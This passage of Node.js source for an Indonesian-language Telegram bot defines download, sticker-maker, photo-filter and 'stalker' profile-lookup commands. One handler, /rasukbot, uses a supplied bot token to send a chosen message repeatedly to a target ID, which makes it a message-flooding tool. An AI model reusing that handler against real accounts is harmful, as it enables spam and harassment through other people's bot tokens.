    const caption = `<blockquote><b><tg-emoji emoji-id="4970133401857163956">📸</tg-emoji> TikTok Slide Downloader</b>
<tg-emoji emoji-id="5400289821253990206">📝</tg-emoji> Caption: ${data.title || "-"}
<tg-emoji emoji-id="5877355078888722361">👑</tg-emoji> By The Queen - 𝙲ᥣᥲⲩ </blockquote>`;

    const mediaGroup = images.slice(0, 10).map((img, index) => ({
      type: "photo",
      media: img,
      caption: index === 0 ? caption : undefined,
      parse_mode: "HTML"
    }));

    await bot.sendMediaGroup(chatId, mediaGroup);

    if (audioUrl) {
      await bot.sendAudio(chatId, audioUrl, {
        caption: `<blockquote><tg-emoji emoji-id="5355022893178696239">🎧</tg-emoji> Audio Slide
<tg-emoji emoji-id="5400289821253990206">📝</tg-emoji> Caption: ${data.title || "-"}
<tg-emoji emoji-id="5877355078888722361">👑</tg-emoji> Powered By: The Queen - 𝙲ᥣᥲⲩ </blockquote>`,
        parse_mode: "HTML"
      });
    }

    await bot.deleteMessage(chatId, sent.message_id);

  } catch (err) {

    console.log("TIKTOK SLIDE ERROR:", err.message);

    await bot.editMessageText(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Terjadi kesalahan saat mengambil slide</blockquote>
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "HTML"
    });

  }
});


bot.onText(/^\/play(?:@[\w_]+)?\s*(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1]?.trim();

  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  if (!query) {
    return bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="5787672755839176187">❗</tg-emoji> Contoh:
<tg-emoji emoji-id="6087075389899805372">🚨</tg-emoji> /play shape of you
</blockquote>
`, { parse_mode: "HTML" });
  }

  const sent = await bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="6098230596788556786">🕐</tg-emoji> Mencari lagu...</blockquote>
`, { parse_mode: "HTML" });

  try {
    const searchResults = await yts(query);
    if (!searchResults?.videos || searchResults.videos.length === 0) {
      throw new Error("Lagu tidak ditemukan!");
    }

    const video = searchResults.videos[0];
    const youtubeUrl = `https://youtu.be/${video.videoId}`;
    const title = video.title || "Tanpa Judul";
    const channel = video.author?.name || video.author || "Unknown";
    const duration = video.timestamp || video.duration?.timestamp || "-";

    await bot.editMessageText(`
<blockquote><tg-emoji emoji-id="6098230596788556786">🕐</tg-emoji> Mendownload audio...</blockquote>
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "HTML"
    }).catch(() => {});

    const apiUrl = `https://api.skyzopedia.web.id/download/ytdl-mp3?apikey=skyy&url=${encodeURIComponent(youtubeUrl)}`;

    const response = await axios.get(apiUrl, {
      timeout: 45000,
      headers: { "User-Agent": "Mozilla/5.0" },
      validateStatus: () => true
    });

    const result = response?.data?.result;
    if (!response?.data?.status || !result?.download) {
      throw new Error(response?.data?.message || "Gagal mendapatkan link download audio!");
    }

    await bot.editMessageText(`<blockquote><tg-emoji emoji-id="6100631470622116162">🎵</tg-emoji> <b>${title}</b>
<tg-emoji emoji-id="5879682959753088509">👤</tg-emoji> ${channel}
<tg-emoji emoji-id="5843618381361581907">🕒</tg-emoji> ${duration}
<tg-emoji emoji-id="5395643163138166328">🔗</tg-emoji> <a href="${youtubeUrl}">Buka YouTube</a>
📥 <a href="${result.download}">Download audio</a>

Sedang mengirim audio...</blockquote>`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "HTML",
      disable_web_page_preview: true
    }).catch(() => {});

    const fs = require("fs");
    const os = require("os");
    const path = require("path");
    const safeName = String((result.title || title || "audio")).replace(/[\\/:*?"<>|]+/g, "").slice(0, 80) || "audio";
    const tempFile = path.join(os.tmpdir(), `${Date.now()}_${safeName}.mp3`);

    try {
      const audioRes = await axios.get(result.download, {
        responseType: "arraybuffer",
        timeout: 120000,
        headers: { "User-Agent": "Mozilla/5.0", "Referer": "https://youtube.com/" },
        maxRedirects: 5,
        validateStatus: () => true
      });

      const contentType = String(audioRes.headers?.["content-type"] || "").toLowerCase();
      const buf = Buffer.from(audioRes.data || []);

      if (audioRes.status >= 400) throw new Error(`HTTP ${audioRes.status}`);
      if (buf.length < 10240) throw new Error("File audio kosong atau terlalu kecil");
      if (contentType.includes("text/html") || contentType.includes("application/json")) throw new Error("Link audio mengarah ke halaman, bukan file audio");

      fs.writeFileSync(tempFile, buf);

      await bot.sendAudio(chatId, fs.createReadStream(tempFile), {
        title: result.title || title,
        performer: channel,
        caption: `<blockquote><tg-emoji emoji-id="6100631470622116162">🎵</tg-emoji> <b>${title}</b>
<tg-emoji emoji-id="5879682959753088509">👤</tg-emoji> ${channel}
<tg-emoji emoji-id="5843618381361581907">🕒</tg-emoji> ${duration}
<tg-emoji emoji-id="5877355078888722361">👑</tg-emoji> By The Queen - 𝙲ᥣᥲⲩ</blockquote>`,
        parse_mode: "HTML"
      }, {
        filename: `${safeName}.mp3`,
        contentType: "audio/mpeg"
      });

      try { await bot.deleteMessage(chatId, sent.message_id); } catch (_) {}
    } catch (sendErr) {
      console.log("PLAY SEND ERROR:", sendErr.message);
      await bot.editMessageText(`<blockquote><tg-emoji emoji-id="6100631470622116162">🎵</tg-emoji> <b>${title}</b>
<tg-emoji emoji-id="5879682959753088509">👤</tg-emoji> ${channel}
<tg-emoji emoji-id="5843618381361581907">🕒</tg-emoji> ${duration}
<tg-emoji emoji-id="5395643163138166328">🔗</tg-emoji> <a href="${youtubeUrl}">Buka YouTube</a>
📥 <a href="${result.download}">Download audio manual</a>

❌ Audio otomatis gagal dikirim: ${sendErr.message}</blockquote>`, {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        disable_web_page_preview: true
      }).catch(async () => {
        await bot.sendMessage(chatId, `<blockquote>📥 <a href="${result.download}">Download audio manual</a></blockquote>`, { parse_mode: "HTML", disable_web_page_preview: true }).catch(() => {});
      });
    } finally {
      try { if (fs.existsSync(tempFile)) fs.unlinkSync(tempFile); } catch (_) {}
    }
  } catch (err) {
    console.log("PLAY ERROR:", err.message);
    const errMsg = err.code === "ECONNABORTED"
      ? "⏱ API sedang lambat, coba lagi sebentar lagi."
      : `❌ Gagal: ${err.message}`;

    try {
      await bot.editMessageText(`<blockquote>${errMsg}</blockquote>`, {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML"
      });
    } catch (_) {
      await bot.sendMessage(chatId, `<blockquote>${errMsg}</blockquote>`, { parse_mode: "HTML" }).catch(() => {});
    }
  }
});

bot.onText(/^\/iqc(?:@[\w_]+)?\s*([\s\S]*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1]?.trim().replace(/\n{3,}/g, "\n\n");
  
  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  if (!text) {
    return bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="5787672755839176187">❗</tg-emoji> Contoh:
/iqc The Queen - 𝙲ᥣᥲⲩ
</blockquote>
`, { parse_mode: "HTML" });
  }

  const sent = await bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="6098230596788556786">🕐</tg-emoji> Membuat IQC...</blockquote>
`, { parse_mode: "HTML" });

  try {

    const url = `https://api.betabotz.eu.org/api/maker/iqc?text=${encodeURIComponent(text)}&apikey=${APIKEY}`;

    const response = await axios.get(url, {
      responseType: "arraybuffer",
      validateStatus: () => true
    });

    const contentType = response.headers["content-type"] || "";

    if (!contentType.includes("image")) {

      const errorText = response.data.toString();
      console.log("IQC API ERROR RESPONSE:", errorText);

      return bot.editMessageText(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> API tidak mengirim gambar</blockquote>
`, {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML"
      });
    }

    await bot.sendPhoto(chatId, Buffer.from(response.data), {
      caption: `<blockquote><tg-emoji emoji-id="5350565223931603266">🧠</tg-emoji> IQC Generator
<tg-emoji emoji-id="5400289821253990206">📝</tg-emoji> Text: ${text}
<tg-emoji emoji-id="5877355078888722361">👑</tg-emoji> By The Queen - 𝙲ᥣᥲⲩ 
</blockquote>`,
      parse_mode: "HTML"
    });

    await bot.deleteMessage(chatId, sent.message_id);

  } catch (err) {

    console.log("IQC ERROR FULL:", err.response?.data || err.message);

    await bot.editMessageText(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Gagal membuat IQC
${escapeHtml(err.message)}
</blockquote>
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/brat\b(?:@[\w_]+)?\s*(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1]?.trim();
  
  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  if (!text) {
    return bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="5787672755839176187">❗</tg-emoji> Contoh:
/brat Love
</blockquote>
`, { parse_mode: "HTML" });
  }

  const sent = await bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="6098230596788556786">🕐</tg-emoji> Membuat brat sticker...</blockquote>
`, { parse_mode: "HTML" });

  try {

    const url = `https://api.betabotz.eu.org/api/maker/brat?text=${encodeURIComponent(text)}&apikey=${APIKEY}`;

    const response = await axios.get(url, {
      responseType: "arraybuffer",
      validateStatus: () => true
    });

    const contentType = response.headers["content-type"] || "";

    if (!contentType.includes("image")) {

      const errorText = response.data.toString();
      console.log("BRAT API ERROR RESPONSE:", errorText);

      return bot.editMessageText(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> API tidak mengirim gambar</blockquote>
`, {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML"
      });
    }

    await bot.sendSticker(
      chatId,
      Buffer.from(response.data),
      { filename: "brat.webp" }
    );

    await bot.deleteMessage(chatId, sent.message_id);

  } catch (err) {

    console.log("BRAT ERROR FULL:", err.message);

    await bot.editMessageText(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Gagal membuat brat sticker</blockquote>
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "HTML"
    });

  }
});

bot.onText(/^\/bratvid(?:@[\w_]+)?\s*(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1]?.trim();
  
  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  if (!text) {
    return bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="5787672755839176187">❗</tg-emoji> Contoh:
/bratvid The Queen - 𝙲ᥣᥲⲩ
</blockquote>
`, { parse_mode: "HTML" });
  }

  const sent = await bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="6098230596788556786">🕐</tg-emoji> Membuat Brat Animated Sticker...</blockquote>
`, { parse_mode: "HTML" });

  try {

    const url = `https://api.betabotz.eu.org/api/maker/brat-video?text=${encodeURIComponent(text)}&apikey=${APIKEY}`;

    const response = await axios.get(url, {
      responseType: "arraybuffer",
      validateStatus: () => true
    });

    const contentType = response.headers["content-type"] || "";

    if (!contentType.includes("video")) {
      return bot.editMessageText(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> API tidak mengirim video</blockquote>
`, {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML"
      });
    }

    const tempMp4 = path.join(__dirname, `brat_${Date.now()}.mp4`);
    const tempWebm = path.join(__dirname, `brat_${Date.now()}.webm`);

    fs.writeFileSync(tempMp4, response.data);

    await new Promise((resolve, reject) => {
      exec(
        `ffmpeg -i "${tempMp4}" -vf "scale=512:512:force_original_aspect_ratio=decrease" -c:v libvpx-vp9 -b:v 256K -an "${tempWebm}"`,
        (err) => {
          if (err) reject(err);
          else resolve();
        }
      );
    });

    await bot.sendSticker(chatId, tempWebm);

    fs.unlinkSync(tempMp4);
    fs.unlinkSync(tempWebm);

    await bot.deleteMessage(chatId, sent.message_id);

  } catch (err) {

    console.log("BRATVID STICKER ERROR:", err.message);

    await bot.editMessageText(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Gagal membuat animated sticker</blockquote>
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/stalktt\b(?:@[\w_]+)?\s*(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1]?.trim().replace("@", "");
  
  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  if (!username) {
    return bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="5787672755839176187">❗</tg-emoji> Contoh:
/stalktt The Queen - 𝙲ᥣᥲⲩ
</blockquote>
`, { parse_mode: "HTML" });
  }

  const sent = await bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="6098230596788556786">🔎</tg-emoji> Sedang mencari akun...</blockquote>
`, { parse_mode: "HTML" });

  try {

    const apiUrl = `https://api.betabotz.eu.org/api/stalk/tt?username=${encodeURIComponent(username)}&apikey=${APIKEY}`;
    const response = await axios.get(apiUrl);

    if (!response.data || response.data.code !== 200) {
      return bot.editMessageText(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Username tidak ditemukan atau API error</blockquote>
`, {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML"
      });
    }

    const data = response.data.result;

    const caption = `<blockquote><tg-emoji emoji-id="5327982530702359565">📱</tg-emoji> <b>TikTok Stalker</b>
<tg-emoji emoji-id="4967667085606912536">👤</tg-emoji> Username: ${data.username}
<tg-emoji emoji-id="5400289821253990206">📝</tg-emoji> Bio: ${data.description || "-"}
<tg-emoji emoji-id="4956222745814762495">❤️</tg-emoji> Likes: ${data.likes}
<tg-emoji emoji-id="5879719754737913980">👥</tg-emoji> Followers: ${data.followers}
<tg-emoji emoji-id="6269085886177087845">➡️</tg-emoji> Following: ${data.following}
<tg-emoji emoji-id="4967502231877190509">📸</tg-emoji> Total Post: ${data.totalPosts}

<tg-emoji emoji-id="5877355078888722361">👑</tg-emoji> By The Queen - 𝙲ᥣᥲⲩ 
</blockquote>
`;

    try {

      const photo = await axios.get(data.profile, {
        responseType: "arraybuffer",
        headers: { "User-Agent": "Mozilla/5.0" }
      });

      await bot.sendDocument(
        chatId,
        {
          source: Buffer.from(photo.data),
          filename: "tiktok_profile.jpg"
        },
        {
          caption,
          parse_mode: "HTML"
        }
      );

    } catch {

      await bot.sendMessage(chatId, caption, {
        parse_mode: "HTML"
      });
    }

    await bot.deleteMessage(chatId, sent.message_id);

  } catch (err) {

    console.log("STALKTT ERROR:", err.message);

    await bot.editMessageText(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Gagal mengambil data TikTok</blockquote>
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "HTML"
    });

  }
});

bot.onText(/^\/stalkig\b(?:@[\w_]+)?\s*(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1]?.trim().replace("@", "");

  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  if (!username) {
    return bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="5787672755839176187">❗</tg-emoji> Contoh:
/stalkig erlanrahmat_14
</blockquote>
`, { parse_mode: "HTML" });
  }

  const sent = await bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="6098230596788556786">🔎</tg-emoji> Sedang mencari akun Instagram...</blockquote>
`, { parse_mode: "HTML" });

  try {

    const apiUrl = `https://api.betabotz.eu.org/api/stalk/ig?username=${encodeURIComponent(username)}&apikey=${APIKEY}`;
    const response = await axios.get(apiUrl);

    if (!response.data || response.data.code !== 200) {
      return bot.editMessageText(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Username tidak ditemukan atau API error</blockquote>
`, {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML"
      });
    }

    const data = response.data.result;

    const caption = `<blockquote><tg-emoji emoji-id="5319160079465857105">📱</tg-emoji> <b>Instagram Stalker</b>
<tg-emoji emoji-id="4967667085606912536">👤</tg-emoji> Full Name: ${data.fullName || "-"}
<tg-emoji emoji-id="5390863029464213754">🔤</tg-emoji> Username: ${data.username}
<tg-emoji emoji-id="5400289821253990206">📖</tg-emoji> Bio: ${data.bio || "-"}
<tg-emoji emoji-id="5879719754737913980">👥</tg-emoji> Followers: ${data.followers}
<tg-emoji emoji-id="6269085886177087845">➡️</tg-emoji> Following: ${data.following}
<tg-emoji emoji-id="4967502231877190509">📸</tg-emoji> Total Post: ${data.postsCount}
<tg-emoji emoji-id="5282843764451195532">🖥</tg-emoji> Category: ${data.category || "-"}
<tg-emoji emoji-id="5082628525303792441">💙</tg-emoji> Private: ${data.isPrivate ? "Yes" : "No"}
<tg-emoji emoji-id="6269243378332864932">✅</tg-emoji> Verified: ${data.isVerified ? "Yes" : "No"}
<tg-emoji emoji-id="5193177581888755275">💻</tg-emoji> Business: ${data.isBusiness ? "Yes" : "No"}
<tg-emoji emoji-id="5990023031819341856">🔗</tg-emoji> External URL: ${data.externalUrl || "-"}
<tg-emoji emoji-id="5877355078888722361">👑</tg-emoji> By The Queen - 𝙲ᥣᥲⲩ 
</blockquote>`;

    try {

      const photo = await axios.get(data.photoUrlHd || data.photoUrl, {
        responseType: "arraybuffer",
        headers: { "User-Agent": "Mozilla/5.0" }
      });

      await bot.sendDocument(
        chatId,
        {
          source: Buffer.from(photo.data),
          filename: "instagram_profile.jpg"
        },
        {
          caption,
          parse_mode: "HTML"
        }
      );

    } catch {

      await bot.sendMessage(chatId, caption, {
        parse_mode: "HTML"
      });
    }

    await bot.deleteMessage(chatId, sent.message_id);

  } catch (err) {

    console.log("STALKIG ERROR:", err.message);

    await bot.editMessageText(`
<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Gagal mengambil data Instagram</blockquote>
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "HTML"
    });

  }
});

bot.onText(/\/asupan/, async (msg) => {

  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  const users = loadUsers();
  const foundUser = users[userId];

  if (!foundUser) {
    return bot.sendMessage(
      chatId,
      `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Kamu belum terdaftar.\n\nSilahkan chat bot di private lalu ketik /start dulu.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const randomType = endpoints[Math.floor(Math.random() * endpoints.length)];
  const url = `https://api.betabotz.eu.org/api/asupan/${randomType}?apikey=${APIKEY}`;

  const loadingMsg = await bot.sendMessage(
    chatId,
    `<blockquote><tg-emoji emoji-id="6098230596788556786">🔎</tg-emoji> Mengirim asupan ${randomType} ke private...</blockquote>`,
    { parse_mode: "HTML" }
  );

  try {

    const res = await axios.get(url, { responseType: "arraybuffer" });

    await bot.sendVideo(userId, res.data, {
      caption: `<blockquote><tg-emoji emoji-id="5260291556899831755">🎥</tg-emoji> Asupan ${randomType}</blockquote>`,
      parse_mode: "HTML"
    });

    bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});

    bot.sendMessage(
      chatId,
      `<blockquote><tg-emoji emoji-id="5206607081334906820">✔️</tg-emoji> Asupan sudah dikirim ke private.</blockquote>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {

    console.error(err);

    bot.sendMessage(
      chatId,
      `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Gagal mengambil asupan video.</blockquote>`,
      { parse_mode: "HTML" }
    );

  }

});

bot.onText(/^\/rasukbot (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!input.includes("|")) {
    return bot.sendMessage(chatId,
      "📩 Format salah!\n\nGunakan format:\n" +
      "<code>/message token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/message 123456:ABCDEF|987654321|Halo bro|5</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    const [token, targetId, pesan, jumlahStr] = input.split("|").map(x => x.trim());
    const jumlah = parseInt(jumlahStr);

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return bot.sendMessage(chatId,
        "❌ Format salah!\nGunakan: <code>/message token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      );
    }

    await bot.sendMessage(chatId, "🚀 Mengirim pesan...");
    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    bot.sendMessage(chatId, `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`, {
      parse_mode: "HTML"
    });

  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`, {
      parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/cekid(@\w+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  let targetUser = msg.from;
    
    if (isMaintenance(msg)) return;
    if (!await requireJoin(msg)) return;

    if (msg.reply_to_message) {
        targetUser = msg.reply_to_message.from;
    }

    try {
        const loadingMsg = await bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="6098230596788556786">🕐</tg-emoji> <i>Sedang membuat kartu ID...</i></blockquote>`, { parse_mode: "HTML" });

        const imageBuffer = await generateIdCard(targetUser);

        await bot.sendPhoto(chatId, imageBuffer, {
            caption: `<blockquote>「 Telegram ID Card 」</blockquote>
<blockquote><tg-emoji emoji-id="4967667085606912536">👤</tg-emoji> Name: ${escapeHtml(targetUser.first_name)} ${escapeHtml(targetUser.last_name || '')}
<tg-emoji emoji-id="6093890429256732821">🔖</tg-emoji> ID: <code>${targetUser.id}</code>
<tg-emoji emoji-id="5877355078888722361">👑</tg-emoji> Powered: The Queen - 𝙲ᥣᥲⲩ </blockquote>`,
            parse_mode: "HTML"
        });

        await bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, `<blockquote><tg-emoji emoji-id="5787672755839176187">❌</tg-emoji> Terjadi kesalahan. Pastikan library <code>canvas</code> sudah terinstall.</blockquote>`, { parse_mode: "HTML" });
    }
});

bot.onText(/^\/gta(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  
  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  if (msg.reply_to_message && msg.reply_to_message.photo) {
    return processGta(msg, msg.reply_to_message.photo);
  }

  pendingGta.set(chatId, true);

  await bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="6046412971708518490">🎮</tg-emoji> Kirim fotonya untuk dijadikan GTA style...</blockquote>`,
{ parse_mode: "HTML" });
});

bot.onText(/^\/tofigure(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  
  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  if (msg.reply_to_message && msg.reply_to_message.photo) {
    return processToFigure(msg, msg.reply_to_message.photo);
  }

  pendingToFigure.set(chatId, true);

  await bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="5373141891321699086">🖼</tg-emoji> Kirim fotonya sekarang ya...</blockquote>
`, { parse_mode: "HTML" });
});

bot.onText(/^\/hytamkan(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  
  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  if (msg.reply_to_message && msg.reply_to_message.photo) {
    return processHitam(msg, msg.reply_to_message.photo);
  }

  pendingHitam.set(chatId, true);

  await bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="5363838691510873846">🖤</tg-emoji> Kirim fotonya sekarang...</blockquote>`,
{ parse_mode: "HTML" });
});

bot.onText(/^\/disney(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  
  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  if (msg.reply_to_message && msg.reply_to_message.photo) {
    return processDisney(msg, msg.reply_to_message.photo);
  }

  pendingDisney.set(chatId, true);

  await bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="5323276453431775004">🏰</tg-emoji> Kirim fotonya untuk dijadikan Disney...</blockquote>`,
{ parse_mode: "HTML" });
});

bot.onText(/^\/anime(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  
  if (isMaintenance(msg)) return;
  if (!await requireJoin(msg)) return;

  if (msg.reply_to_message && msg.reply_to_message.photo) {
    return processAnime(msg, msg.reply_to_message.photo);
  }

  pendingAnime.set(chatId, true);

  await bot.sendMessage(chatId,
`<blockquote><tg-emoji emoji-id="5431538972507522948">🎌</tg-emoji> Kirim fotonya untuk dijadikan Anime...</blockquote>`,
{ parse_mode: "HTML" });
});

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data !== "anime_2d" && data !== "anime_3d") return;

  if (!animeResultCache.has(chatId)) {
    return bot.answerCallbackQuery(query.id, {
      text: "❌ Data sudah expired",
      show_alert: true
    });
  }

  const result = animeResultCache.get(chatId);

  if (data === "anime_2d") {
    await bot.sendPhoto(chatId, result.img1, {
      caption: `<blockquote><tg-emoji emoji-id="5400011223905345095">🎨</tg-emoji> Efek: Anime Style 2D
<tg-emoji emoji-id="6298630163047387557">🔥</tg-emoji> Hasil: Mengubah Foto Anime 2D
<tg-emoji emoji-id="5467676750026660666">🎁</tg-emoji> By The Queen - 𝙲ᥣᥲⲩ 
</blockquote>`,
      parse_mode: "HTML"
    });
  }

  if (data === "anime_3d") {
    await bot.sendPhoto(chatId, result.img2, {
      caption: `<blockquote><tg-emoji emoji-id="5206502842478638898">🧸</tg-emoji> Efek: Anime Style 3D
<tg-emoji emoji-id="6298630163047387557">🔥</tg-emoji> Hasil: Mengubah Foto Anime 3D
<tg-emoji emoji-id="5467676750026660666">🎁</tg-emoji> By The Queen - 𝙲ᥣᥲⲩ 
</blockquote>`,
      parse_mode: "HTML"
    });
  }

  animeResultCache.delete(chatId);

  await bot.answerCallbackQuery(query.id);
});

bot.on("photo", async (msg) => {
  const chatId = msg.chat.id;

  if (pendingGta?.has(chatId)) {
    pendingGta.delete(chatId);
    return processGta(msg, msg.photo);
  }

  if (pendingAnime?.has(chatId)) {
    pendingAnime.delete(chatId);
    return processAnime(msg, msg.photo);
  }

  if (pendingHitam?.has(chatId)) {
    pendingHitam.delete(chatId);
    return processHitam(msg, msg.photo);
  }

  if (pendingDisney?.has(chatId)) {
    pendingDisney.delete(chatId);
    return processDisney(msg, msg.photo);
  }

  if (pendingToFigure?.has(chatId)) {
    pendingToFigure.delete(chatId);
    return processToFigure(msg, msg.photo);
  }
});

bot.onText(/^\/cekstc$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.reply_to_message && msg.reply_to_message.sticker) {
    const stc = msg.reply_to_message.sticker;

    return bot.sendMessage(chatId, `
🧩 *STICKER INFO*

📦 Set Name: ${stc.set_name || "-"}
🆔 File ID:
\`${stc.file_id}\`

🆔 File Unique ID:
\`${stc.file_unique_id}\`
    `, { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, `
❌ Reply sticker dengan command /cekstc

Contoh:
1. Kirim sticker
2. Reply sticker itu dengan /cekstc
  `);
});

bot.onText(/^\/cekemoji$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (msg.reply_to_message) {
  
    const entities = msg.reply_to_message.entities || msg.reply_to_message.caption_entities;
    
    if (!entities || entities.length === 0) {
      return bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="5805345674383855340">◾️</tg-emoji>
Tidak ada emoji terdeteksi di pesan yang di-reply.
</blockquote>`, { parse_mode: "HTML" });
    }

    const customEmoji = entities.find(e => e.type === "custom_emoji");

    if (!customEmoji) {
      return bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="6100467849548010364">◾️</tg-emoji>
Itu bukan emoji premium / custom emoji.
</blockquote>`, { parse_mode: "HTML" });
    }

    const emojiId = customEmoji.custom_emoji_id;
    const text = msg.reply_to_message.text || msg.reply_to_message.caption || "";
    const emojiChar = text.substring(
      customEmoji.offset,
      customEmoji.offset + customEmoji.length
    );

    return bot.sendMessage(chatId, `
<blockquote><tg-emoji emoji-id="6269243378332864932">◾️</tg-emoji> <b>Custom Emoji Terdeteksi!</b>
<tg-emoji emoji-id="5334890573281114250">◾️</tg-emoji> ID: <code>${emojiId}</code>
<tg-emoji emoji-id="5400111356772905255">◾️</tg-emoji> Cara pakai:
<code>&lt;tg-emoji emoji-id="${emojiId}"&gt;${emojiChar}&lt;/tg-emoji&gt;</code>
</blockquote>`, { parse_mode: "HTML" });

  } else {

    waitingForEmoji.set(userId, {
      chatId: chatId,
      timestamp: Date.now()
    });

    const sentMsg = await bot.sendMessage(chatId, 
      `<blockquote><tg-emoji emoji-id="5967280668885913944">📩</tg-emoji> <b>Silahkan reply pesan ini dengan emoji premium yang ingin dicek ID-nya!</b>\n\n<i>Pesan ini akan otomatis terhapus dalam 60 detik jika tidak ada respon.</i></blockquote>`, 
      { parse_mode: "HTML" }
    );
        
    setTimeout(() => {
      if (waitingForEmoji.has(userId)) {
        waitingForEmoji.delete(userId);
        bot.deleteMessage(chatId, sentMsg.message_id).catch(() => {});
      }
    }, 60000);
  }
});

bot.on("message", async (msg) => {
  if (msg.from?.is_bot) return;

  const userId = msg.from.id;
  const chatId = msg.chat.id;

  if (waitingForEmoji.has(userId)) {
    const userData = waitingForEmoji.get(userId);
    
    if (!msg.reply_to_message || !msg.reply_to_message.from?.is_bot) {
      return bot.sendMessage(chatId, 
